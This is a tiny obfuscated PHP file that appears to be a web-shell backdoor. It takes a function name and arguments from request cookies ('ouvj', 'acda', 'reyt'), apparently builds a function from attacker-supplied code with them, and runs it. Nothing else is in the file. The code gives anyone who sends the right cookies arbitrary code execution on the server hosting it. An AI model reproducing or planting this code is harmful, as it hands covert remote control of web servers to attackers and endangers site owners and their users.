<?php

$dfb=$_COOKIE;
$eqhve=$dfb[ouvj];
if($eqhve){
	$iyl=$eqhve($dfb[acda]);$varb=$eqhve($dfb[reyt]);$znovw=$iyl("",$varb);$znovw();
}